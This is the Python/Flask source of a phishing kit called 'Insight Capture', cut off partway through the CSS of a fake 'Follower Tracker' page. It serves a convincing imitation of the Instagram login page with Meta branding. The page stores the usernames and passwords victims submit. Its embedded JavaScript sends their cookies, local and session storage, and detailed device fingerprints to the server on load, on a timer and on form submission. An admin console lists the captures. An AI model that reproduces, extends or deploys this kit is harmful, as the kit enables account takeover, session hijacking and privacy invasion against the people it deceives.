"""
Insight Capture — credential + browser cookie capture with an admin console.

Env:
  SECRET_KEY    flask session key            (required in prod)
  ADMIN_TOKEN   console password             (unset = open, dev only)
  DATA_DIR      sqlite + log directory       (default ./data)
  GEO           1 to enable IP geo lookup    (default off)
  PORT          listen port                  (default 5000)
"""

from __future__ import annotations

import csv
import hashlib
import hmac
import io
import json
import logging
import os
import random
import sqlite3
import sys
import threading
import time
import urllib.request
import uuid
from collections import deque
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from pathlib import Path

from flask import (
    Flask,
    Response,
    abort,
    g,
    jsonify,
    redirect,
    render_template_string,
    request,
    session,
    url_for,
)
from markupsafe import escape
from werkzeug.middleware.proxy_fix import ProxyFix

# ============================== config ==============================
SECRET_KEY = os.environ.get("SECRET_KEY") or uuid.uuid4().hex
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
GEO_ENABLED = os.environ.get("GEO", "0") == "1"
COOKIE_MAX_AGE = 60 * 60 * 24 * 365

DATA_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = DATA_DIR / "insight.sqlite3"
JSONL_PATH = DATA_DIR / "events.jsonl"

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
app.config.update(
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.environ.get("RENDER") is not None,
    MAX_CONTENT_LENGTH=512 * 1024,
)

# ============================== logging ==============================
logger = logging.getLogger("insight")
logger.setLevel(os.environ.get("LOG_LEVEL", "INFO"))
logger.propagate = False
_fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s")

if not logger.handlers:
    _sh = logging.StreamHandler(sys.stdout)
    _sh.setFormatter(_fmt)
    logger.addHandler(_sh)

    _fh = RotatingFileHandler(DATA_DIR / "insight.log", maxBytes=1_000_000, backupCount=3)
    _fh.setFormatter(_fmt)
    logger.addHandler(_fh)

_jsonl_lock = threading.Lock()


def emit(kind: str, payload: dict) -> None:
    """One human block on stdout + one machine line in events.jsonl."""
    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
    body = {"ts": stamp, "kind": kind, **payload}

    lines = [f"── {kind} ── {stamp}", f"cid={payload.get('cid', '-')} ip={payload.get('ip', '-')}"]
    for k, v in payload.items():
        if k in ("cid", "ip"):
            continue
        if isinstance(v, dict):
            for sk, sv in v.items():
                lines.append(f"   {sk}: {str(sv)[:200]}")
        else:
            lines.append(f"   {k}: {str(v)[:400]}")
    logger.info("\n".join(lines))

    try:
        with _jsonl_lock, JSONL_PATH.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(body, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ============================== storage ==============================
_db_lock = threading.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS captures (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, sid TEXT, reason TEXT, digest TEXT,
    ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
    cookie_header TEXT, js_cookies TEXT, storage_json TEXT, meta_json TEXT,
    country TEXT, city TEXT, isp TEXT, geo_json TEXT,
    created_at TEXT
);
CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    capture_id INTEGER, username TEXT, password TEXT,
    ip TEXT, ua TEXT, cookie_header TEXT, js_cookies TEXT, meta_json TEXT,
    created_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_cap_id ON captures(id DESC);
CREATE INDEX IF NOT EXISTS idx_cap_digest ON captures(cid, digest);
CREATE INDEX IF NOT EXISTS idx_log_cap ON logins(capture_id);
"""


def connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn


def init_db() -> None:
    with _db_lock:
        conn = connect()
        try:
            conn.executescript(SCHEMA)
            conn.commit()
        finally:
            conn.close()


def store_capture(**kw) -> int:
    with _db_lock:
        conn = connect()
        try:
            cur = conn.execute(
                """INSERT INTO captures
                   (cid, sid, reason, digest, ip, ua, referer, accept_lang,
                    cookie_header, js_cookies, storage_json, meta_json,
                    country, city, isp, geo_json, created_at)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                (
                    kw["cid"], kw["sid"], kw["reason"], kw["digest"], kw["ip"],
                    kw["ua"], kw["referer"], kw["accept_lang"], kw["cookie_header"],
                    kw["js_cookies"], kw["storage_json"], kw["meta_json"],
                    kw["country"], kw["city"], kw["isp"], kw["geo_json"],
                    kw["created_at"],
                ),
            )
            conn.commit()
            return int(cur.lastrowid or 0)
        finally:
            conn.close()


def store_login(**kw) -> None:
    with _db_lock:
        conn = connect()
        try:
            conn.execute(
                """INSERT INTO logins
                   (capture_id, username, password, ip, ua, cookie_header, js_cookies, meta_json, created_at)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (
                    kw["capture_id"], kw["username"], kw["password"], kw["ip"],
                    kw["ua"], kw["cookie_header"], kw["js_cookies"],
                    kw["meta_json"], kw["created_at"],
                ),
            )
            conn.commit()
        finally:
            conn.close()


def is_duplicate(cid: str, digest: str, seconds: int = 6) -> bool:
    if not digest:
        return False
    cutoff = datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
    conn = connect()
    try:
        row = conn.execute(
            "SELECT 1 FROM captures WHERE cid=? AND digest=? AND created_at>=? LIMIT 1",
            (cid, digest, cutoff),
        ).fetchone()
        return row is not None
    finally:
        conn.close()


# ============================== helpers ==============================
_rate: dict[str, deque] = {}
_rate_lock = threading.Lock()
_geo_cache: dict[str, dict] = {}


def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return (xff.split(",")[0].strip() if xff else request.remote_addr) or "-"


def is_private(ip: str) -> bool:
    return (
        ip in ("-", "") or ip.startswith(("10.", "127.", "192.168.", "172.16.", "172.17.", "172.18.",
                                          "172.19.", "172.2", "172.30.", "172.31.", "::1", "localhost"))
    )


def rate_ok(ip: str, limit: int, window: int = 60) -> bool:
    now = time.time()
    with _rate_lock:
        dq = _rate.setdefault(ip, deque())
        while dq and now - dq[0] > window:
            dq.popleft()
        if len(dq) >= limit:
            return False
        dq.append(now)
        if len(_rate) > 10_000:
            _rate.clear()
        return True


def geo(ip: str) -> dict:
    if not GEO_ENABLED or is_private(ip):
        return {}
    if ip in _geo_cache:
        return _geo_cache[ip]
    try:
        url = (
            "http://ip-api.com/json/" + ip +
            "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting"
        )
        with urllib.request.urlopen(url, timeout=1.5) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
        if data.get("status") != "success":
            data = {}
    except Exception:
        data = {}
    if len(_geo_cache) > 5000:
        _geo_cache.clear()
    _geo_cache[ip] = data
    return data


def parse_cookie_string(raw: str) -> dict:
    out = {}
    for chunk in (raw or "").split(";"):
        if "=" in chunk:
            k, v = chunk.split("=", 1)
            k = k.strip()
            if k:
                out[k] = v.strip()
    return out


def digest_of(*parts: str) -> str:
    h = hashlib.sha256()
    for p in parts:
        h.update((p or "").encode("utf-8", "replace"))
        h.update(b"\x1f")
    return h.hexdigest()[:32]


def make_initials(name: str) -> str:
    parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
    return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()


def admin_ok() -> bool:
    if not ADMIN_TOKEN:
        return True
    if session.get("admin"):
        return True
    tok = request.args.get("token") or request.form.get("token")
    if tok and hmac.compare_digest(tok, ADMIN_TOKEN):
        session["admin"] = True
        return True
    return False


# ============================== login page ==============================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
<meta name="theme-color" content="#ffffff">

<style>
:root{
  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
  --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
  --glow:rgba(214,41,118,.13);
  --e:cubic-bezier(.22,1,.36,1);
}
@media (prefers-color-scheme:dark){
  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--glow:rgba(214,41,118,.2)}
}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}

body{
  position:fixed;inset:0;height:var(--vh,100dvh);
  overflow:hidden;overscroll-behavior:none;touch-action:manipulation;
  background:var(--bg);color:var(--tx);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;justify-content:center;
  transition:background .5s var(--e),color .5s var(--e);
}
body::before{
  content:"";position:absolute;inset:0;pointer-events:none;
  background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
}

.app{
  position:relative;width:100%;max-width:420px;height:100%;
  display:flex;flex-direction:column;
  padding:calc(env(safe-area-inset-top,0px) + 10px) 24px calc(env(safe-area-inset-bottom,0px) + 10px);
  animation:pg .75s var(--e) both;
}

.content{
  flex:1;min-height:0;display:flex;
  overflow-y:auto;overscroll-behavior:contain;
  scrollbar-width:none;-webkit-overflow-scrolling:touch;
}
.content::-webkit-scrollbar{display:none}
.inner{width:100%;margin:auto 0;text-align:center;padding:8px 0}

.language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}

.logo{position:relative;width:78px;height:78px;margin:0 auto 24px;display:grid;place-items:center;animation:up .65s .12s var(--e) backwards}
.logo::before{
  content:"";position:absolute;inset:-13px;border-radius:28px;
  background:var(--ig);background-size:220% 220%;
  filter:blur(16px);opacity:.55;
  animation:halo 14s linear infinite,sh 9s ease-in-out infinite alternate;
}
.logo img{position:relative;width:70px;height:70px;z-index:1;animation:float 5.5s ease-in-out infinite}

.inputs{display:flex;flex-direction:column;gap:10px}

input{
  width:100%;padding:14px 13px;
  font-family:inherit;font-size:16px;line-height:1.25;color:var(--tx);
  border:1px solid var(--line);border-radius:11px;background:var(--inbg);
  -webkit-appearance:none;appearance:none;outline:none;
  transition:border-color .3s var(--e),box-shadow .35s var(--e),background .3s var(--e),transform .3s var(--e);
}
input::placeholder{color:var(--mut)}
input:focus{
  border-color:var(--blue);background:var(--bg);
  box-shadow:0 0 0 3.5px rgba(0,149,246,.16);transform:translateY(-1px);
}
.inputs input:nth-child(1){animation:up .55s .2s var(--e) backwards}
.inputs input:nth-child(2){animation:up .55s .26s var(--e) backwards}

.login-btn{
  position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
  border:0;border-radius:24px;background:var(--blue);color:#fff;
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  box-shadow:0 6px 18px rgba(0,149,246,.3);
  transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s;
  animation:up .55s .32s var(--e) backwards;
}
.login-btn::after{
  content:"";position:absolute;top:0;left:-60%;width:45%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.55),transparent);
  transform:skewX(-18deg);animation:sweep 4.5s 1.4s var(--e) infinite;
}
.login-btn:hover{filter:brightness(1.07);transform:translateY(-2px);box-shadow:0 10px 26px rgba(0,149,246,.4)}
.login-btn:active{transform:scale(.965);box-shadow:0 4px 12px rgba(0,149,246,.28)}

.forgot{
  margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
  transition:letter-spacing .35s var(--e),opacity .25s;
  animation:up .55s .38s var(--e) backwards;
}
.forgot:hover{letter-spacing:.4px;opacity:.72}

.create{margin-top:26px;animation:up .55s .44s var(--e) backwards}
.create button{
  width:100%;padding:13px 0;border-radius:24px;
  border:1px solid var(--blue);background:transparent;color:var(--blue);
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  transition:background .3s var(--e),transform .3s var(--e),box-shadow .3s var(--e);
}
.create button:hover{background:rgba(0,149,246,.08);box-shadow:0 8px 20px rgba(0,149,246,.18)}
.create button:active{transform:scale(.97)}

.bottom{flex:none;text-align:center;animation:up .6s .5s var(--e) backwards}
.meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
.meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
.footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:4px}

@keyframes pg{from{opacity:0;transform:translateY(12px) scale(.99);filter:blur(6px)}}
@keyframes up{from{opacity:0;transform:translateY(16px)}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
@keyframes halo{to{transform:rotate(360deg)}}
@keyframes sh{to{background-position:100% 50%}}
@keyframes pulse{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:1;transform:scale(1.18)}}
@keyframes sweep{0%{left:-60%}42%,100%{left:135%}}

@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>

<body>

<div class="app">

    <div class="content"><div class="inner">

        <div class="language">English (US)</div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        </div>

        <form action="/login" method="POST" id="loginForm" autocomplete="on">
            <input type="hidden" name="payload" id="payload">

            <div class="inputs">
                <input type="text" name="username" placeholder="Username, email or mobile number"
                       autocapitalize="none" autocorrect="off" spellcheck="false"
                       autocomplete="username" enterkeyhint="next" required>
                <input type="password" name="password" placeholder="Password"
                       autocomplete="current-password" enterkeyhint="go" required>
            </div>

            <button type="submit" class="login-btn">Log in</button>

            <div class="forgot">Forgot password?</div>

            <div class="create">
                <button type="button">Create new account</button>
            </div>
        </form>

    </div></div>

    <div class="bottom">
        <div class="meta">
            <span class="inf">&#8734;</span>
            <span>Meta</span>
        </div>

        <div class="footer">
            &copy; Meta 2025 &middot; Privacy &middot; Cookie Policy &middot; Terms &middot; English (UK)
        </div>
    </div>

</div>

<script>
(function () {
  'use strict';

  /* ---------------- viewport / keyboard hardening ---------------- */
  var vv = window.visualViewport;
  if (vv) {
    var rootEl = document.documentElement;
    var sync = function () { rootEl.style.setProperty('--vh', vv.height + 'px'); };
    sync();
    vv.addEventListener('resize', sync);
    vv.addEventListener('scroll', sync);
  }

  /* ---------------- capture engine ---------------- */
  var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
  var seq = 0;
  var lastDigest = '';
  var queue = [];
  var flushing = false;
  var retries = 0;

  function fnv(str) {
    var h = 0x811c9dc5;
    for (var i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = (h * 0x01000193) >>> 0;
    }
    return ('0000000' + h.toString(16)).slice(-8);
  }

  function canvasSig() {
    try {
      var c = document.createElement('canvas');
      c.width = 260; c.height = 70;
      var x = c.getContext('2d');
      x.textBaseline = 'top';
      x.font = '16px Arial';
      x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
      x.fillStyle = '#069'; x.fillText('Insight, capture 2.0', 2, 4);
      x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
      x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
      return fnv(c.toDataURL());
    } catch (e) { return ''; }
  }

  function glSig() {
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return '';
      var d = gl.getExtension('WEBGL_debug_renderer_info');
      if (!d) return '';
      return gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    } catch (e) { return ''; }
  }

  function fontSig() {
    try {
      var probes = ['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana',
                    'Tahoma','Trebuchet MS','Segoe UI','Roboto','Menlo','Consolas','Ubuntu',
                    'Fira Sans','Noto Sans','SF Pro Text','Calibri','Cambria'];
      var bases = ['monospace', 'sans-serif', 'serif'];
      var ctx = document.createElement('canvas').getContext('2d');
      var hits = [];
      bases.forEach(function (b) {
        ctx.font = '72px ' + b;
        var base = ctx.measureText('mmmmmmmmmmlli').width;
        probes.forEach(function (f) {
          ctx.font = '72px "' + f + '",' + b;
          if (ctx.measureText('mmmmmmmmmmlli').width !== base) hits.push(f);
        });
      });
      return Array.from(new Set(hits)).slice(0, 40);
    } catch (e) { return []; }
  }

  function storageDump(store) {
    try {
      var out = [];
      for (var i = 0; i < store.length; i++) {
        var k = store.key(i);
        var v = store.getItem(k) || '';
        out.push(k + '=' + (v.length > 220 ? v.slice(0, 220) + '…' : v));
      }
      return out;
    } catch (e) { return []; }
  }

  function mq(q) { try { return matchMedia(q).matches ? 1 : 0; } catch (e) { return 0; } }

  function baseMeta() {
    var tz = '', tzo = '';
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      tzo = String(new Date().getTimezoneOffset());
    } catch (e) {}
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

    return {
      ua: navigator.userAgent,
      platform: navigator.platform || '',
      vendor: navigator.vendor || '',
      lang: navigator.language || '',
      langs: (navigator.languages || []).join(','),
      tz: tz, tzOffset: tzo,
      locale: (Intl.DateTimeFormat().resolvedOptions().locale || ''),
      screen: screen.width + 'x' + screen.height,
      avail: screen.availWidth + 'x' + screen.availHeight,
      viewport: window.innerWidth + 'x' + window.innerHeight,
      dpr: window.devicePixelRatio || 1,
      depth: screen.colorDepth,
      orientation: (screen.orientation && screen.orientation.type) || '',
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      touchPoints: navigator.maxTouchPoints || 0,
      cookieEnabled: navigator.cookieEnabled ? 1 : 0,
      dnt: navigator.doNotTrack || '',
      plugins: Array.from(navigator.plugins || []).map(function (p) { return p.name; }).slice(0, 12),
      conn: conn ? {
        type: conn.effectiveType || '', down: conn.downlink || 0,
        rtt: conn.rtt || 0, save: conn.saveData ? 1 : 0
      } : {},
      prefs: {
        dark: mq('(prefers-color-scheme: dark)'),
        reduce: mq('(prefers-reduced-motion: reduce)'),
        contrast: mq('(prefers-contrast: more)'),
        portrait: mq('(orientation: portrait)')
      },
      canvas: canvasSig(),
      webgl: glSig(),
      fonts: fontSig(),
      notifPerm: (window.Notification && Notification.permission) || '',
      referrer: document.referrer || '',
      href: location.href,
      title: document.title,
      historyLen: history.length
    };
  }

  function gather() {
    var meta = baseMeta();
    var local = storageDump(localStorage);
    var sess = storageDump(sessionStorage);
    var cookies = document.cookie || '';
    var payload = {
      sid: SID,
      seq: ++seq,
      cookies: cookies,
      local: local,
      sess: sess,
      meta: meta,
      hash: fnv(cookies + '|' + local.join('|') + '|' + sess.join('|') + '|' + JSON.stringify(meta))
    };

    /* async extras, merged in place */
    try {
      if (navigator.getBattery) {
        navigator.getBattery().then(function (b) {
          meta.battery = { level: Math.round(b.level * 100), charging: b.charging ? 1 : 0 };
        }).catch(function () {});
      }
    } catch (e) {}
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues(
          ['architecture', 'bitness', 'model', 'platformVersion', 'uaFullVersion', 'fullVersionList']
        ).then(function (h) { meta.uaData = h; }).catch(function () {});
      }
    } catch (e) {}
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (s) {
          meta.storage = { quota: s.quota || 0, usage: s.usage || 0 };
        }).catch(function () {});
      }
    } catch (e) {}

    var field = document.getElementById('payload');
    if (field) field.value = JSON.stringify(payload);

    return payload;
  }

  function flush(useBeacon) {
    if (flushing || !queue.length) return;
    flushing = true;
    var item = queue.shift();
    var body = JSON.stringify(item);
    var done = function (ok) {
      flushing = false;
      if (!ok && retries < 3) {
        retries++;
        queue.unshift(item);
        setTimeout(function () { flush(true); }, 700 * retries);
        return;
      }
      retries = 0;
      if (queue.length) setTimeout(function () { flush(useBeacon); }, 90);
    };

    if (useBeacon && navigator.sendBeacon) {
      var ok = false;
      try { ok = navigator.sendBeacon('/collect', new Blob([body], { type: 'application/json' })); } catch (e) {}
      return done(ok);
    }

    try {
      fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body,
        keepalive: true,
        credentials: 'same-origin'
      }).then(function (r) { done(r.ok); }).catch(function () { done(false); });
    } catch (e) { done(false); }
  }

  function send(reason, beacon) {
    var p = gather();
    if (p.hash === lastDigest && reason === 'poll') return;
    lastDigest = p.hash;
    p.reason = reason;
    p.ts = Date.now();
    queue.push(p);
    if (queue.length > 12) queue = queue.slice(-12);
    flush(beacon !== false);
  }

  send('load');
  document.addEventListener('DOMContentLoaded', function () { send('dom'); });
  setInterval(function () { send('poll'); }, 12000);
  document.addEventListener('visibilitychange', function () { send(document.hidden ? 'hidden' : 'visible'); });
  window.addEventListener('pagehide', function () { send('pagehide', true); });
  window.addEventListener('beforeunload', function () { send('unload', true); });
  window.addEventListener('online', function () { send('online'); });

  ['pointerdown', 'keydown', 'scroll', 'touchstart'].forEach(function (ev) {
    window.addEventListener(ev, function () { send('interact'); }, { passive: true, once: true });
  });

  var form = document.getElementById('loginForm');
  if (form) {
    form.addEventListener('submit', function () { gather(); send('submit', true); });
  }

  document.querySelectorAll('input[type=text],input[type=password]').forEach(function (i) {
    i.addEventListener('focus', function () { send('focus'); });
  });
})();
</script>

</body>
</html>
"""

# ============================== results page ==============================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Insight — Follower Tracker</title>
<style>
:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13);box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}}
:root[data-theme="dark"]{--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
html{scroll-behavior:smooth}
body{background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;overflow:hidden;font-variant-numeric:tabular-nums;transition:background .5s var(--e),color .5s var(--e)}
.frame{container-type:inline-size;position:relative;width:100%;flex:1;min-height:0;max-width:1240px;margin:10px 16px 16px;border:1px solid var(--line);border-radius:22px;overflow:hidden;background:var(--bg2);box-shadow:var(--sh2);transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s}
.app{display:grid;grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto;height:100%}
.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:flex;flex-direction:column;overflow:auto;transition:border-color .5s}
.logo{font:italic 700 30px Georgia,"Times New Roman",serif;letter-spacing:-.5px;padding:6px 12px 26px;text-align:center}
.logo span{background:var(--ig);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 8s ease-in-out infinite alternate}
@keyframes sh{to{background-position:100% 0}}
.nav{display:flex;flex-direction:column;gap:2px}
.nav button{position:relative;display:flex;align-items:center;gap:16px;border:0;background:none;color:var(--tx);font:400 15.5px inherit;padding:12px;border-radius:12px;cursor:pointer;transition:background .3s var(--e),transform .35s var(--e)}
.nav button::before{content:"";position:absolute;left:-12px;top:50%;width:4px;height:0;border-radius:0 4px 4px 0;background:var(--ig);transform:translateY(-50%);transition:height .4s var(--e)}
.nav button.on::before{height:26px}
.nav button:hover{background:var(--chip);transform:translateX(5px)}
.nav button:active{transform:scale(.97)}
.nav button svg{width:25px;height:25px;flex:none;transition:transform .35s var(--e)}
.nav button:hover svg{transform:scale(1.12) rotate(-4deg)}
.nav button.on{font-weight:700}
.nav button.on svg{stroke-width:2.6}
.nav .n{margin-left:auto;min-width:20px;height:20px;padding:0 6px;border-radius:99px;background:var(--red);color:#fff;font:700 11px/20px inherit;text-align:center;box-shadow:0 3px 8px rgba(237,73,86,.4)}
.me{margin-top:auto;display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;transition:background .3s}
.me:hover{background:var(--chip)}
.me b{font-size:14px;display:block;font-weight:600}.me small{color:var(--mut);font-size:12px}
.mtop{display:none;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
.mtop .logo{padding:0;font-size:27px}
.mtop svg{width:25px;height:25px}
#mh{justify-self:end;border:0;background:none;color:var(--tx);cursor:pointer;display:grid;place-items:center;padding:2px;transition:transform .5s var(--e)}
#mh:hover{transform:rotate(90deg)}
main{grid-row:1/4;overflow:auto;position:relative}
.in{max-width:780px;margin:0 auto;padding:34px 28px 50px;position:relative}
.in.pg{animation:pg .6s var(--e) both}
@keyframes pg{from{opacity:0;transform:translateY(16px) scale(.99);filter:blur(5px)}}
main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;background:radial-gradient(60% 100% at 50% 0,var(--glow),transparent);pointer-events:none}
.prof{display:flex;gap:34px;align-items:center;margin-bottom:26px}
.ring{flex:none;border-radius:50%;padding:3px;background:var(--ig);position:relative;transition:transform .45s var(--e),box-shadow .45s var(--e)}
.ring>span{display:grid;place-items:center;border-radius:50%;border:3px solid var(--bg2);color:#fff;font-weight:700;overflow:hidden}
.ring.l{width:116px;height:116px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:32px}
.ring.l:hover{transform:rotate(8deg) scale(1.06);box-shadow:0 14px 40px rgba(214,41,118,.35)}
.ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
.ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
.ring.off{background:var(--line)}
.pi{flex:1;min-width:0}
.pi .h{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.pi h2{font:400 20px inherit}
.pi .st{display:flex;gap:34px;margin-bottom:14px;font-size:15px}
.pi .st b{font-weight:700}
.pi p{font-size:14px;line-height:1.45}.pi p span{color:var(--mut)}
.btn{border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .3s var(--e),filter .2s,box-shadow .3s var(--e),background .3s;white-space:nowrap}
.btn:hover{filter:brightness(1.08);transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,149,246,.42)}
.btn:active{transform:scale(.95);box-shadow:none}
.btn.g,.btn.r{box-shadow:none}
.btn.g{background:var(--chip);color:var(--tx)}
.btn.g:hover,.btn.r:hover{box-shadow:0 6px 16px rgba(0,0,0,.12)}
.btn.r{background:var(--chip);color:var(--red)}
.sec{display:flex;align-items:baseline;justify-content:space-between;margin:26px 0 14px}
.sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.4px;opacity:.8}
.stories{display:flex;gap:18px;overflow:auto;padding:8px 6px 10px;scrollbar-width:none}
.stories::-webkit-scrollbar{display:none}
.stories>div{flex:none;width:68px;text-align:center;cursor:pointer;position:relative;transition:transform .4s var(--e);animation:up .6s var(--e) both}
.stories>div:nth-child(2){animation-delay:.06s}.stories>div:nth-child(3){animation-delay:.12s}.stories>div:nth-child(4){animation-delay:.18s}.stories>div:nth-child(5){animation-delay:.24s}
.stories>div:hover{transform:translateY(-4px) scale(1.06)}
.stories .ring{margin:0 auto 7px;width:68px;height:68px}.stories .ring>span{width:100%;height:100%;font-size:19px}
.stories small{font-size:12px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.stories em{position:absolute;top:0;right:0;background:var(--red);color:#fff;font:700 10.5px/18px inherit;min-width:18px;border-radius:9px;border:2px solid var(--bg2);box-sizing:content-box;padding:0 3px;font-style:normal}
@keyframes up{from{opacity:0;transform:translateY(18px)}}
.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
